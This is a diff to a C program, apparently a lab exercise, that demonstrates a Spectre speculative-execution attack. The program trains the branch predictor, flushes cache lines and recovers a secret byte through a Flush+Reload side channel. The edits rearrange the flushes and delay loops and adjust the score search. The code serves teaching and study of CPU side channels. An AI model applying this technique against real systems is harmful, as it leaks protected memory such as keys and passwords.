@@ -57,12 +57,11 @@ void spectreAttack(size_t index_beyond)
   int i;
   uint8_t s;
   volatile int z;
+
   for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+
   // Train the CPU to take the true branch inside victim().
   for (i = 0; i < 10; i++) {
-    _mm_clflush(&bound_upper);
-    _mm_clflush(&bound_lower);
-    for (z = 0; z < 100; z++) { }
     restrictedAccess(i);  
   }
 
@@ -70,8 +69,9 @@ void spectreAttack(size_t index_beyond)
   _mm_clflush(&bound_upper);
   _mm_clflush(&bound_lower); 
   for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+  for (z = 0; z < 100; z++)  {  }
+  //
   // Ask victim() to return the secret in out-of-order execution.
-  for (z = 0; z < 100; z++) { }
   s = restrictedAccess(index_beyond);
   array[s*4096 + DELTA] += 88;
 }
@@ -80,21 +80,24 @@ int main() {
   int i;
   uint8_t s;
   size_t index_beyond = (size_t)(secret - (char*)buffer);
+
   flushSideChannel();
   for(i=0;i<256; i++) scores[i]=0; 
+
   for (i = 0; i < 1000; i++) {
     printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
     spectreAttack(index_beyond);
     usleep(10);
     reloadSideChannelImproved();
   }
-  int max = 0;
-  for (i = 0; i < 256; i++){
-   if(scores[max] < scores[i])  
-     max = i;
+
+  int max = 1;
+  for (i = 1; i < 256; i++){
+    if(scores[max] < scores[i]) max = i;
   }
+
   printf("Reading secret value at index %ld\n", index_beyond);
-  printf("The  secret value is %d(%c)\n", max, max);
+  printf("The secret value is %d(%c)\n", max, max);
   printf("The number of hits is %d\n", scores[max]);
   return (0); 
 }
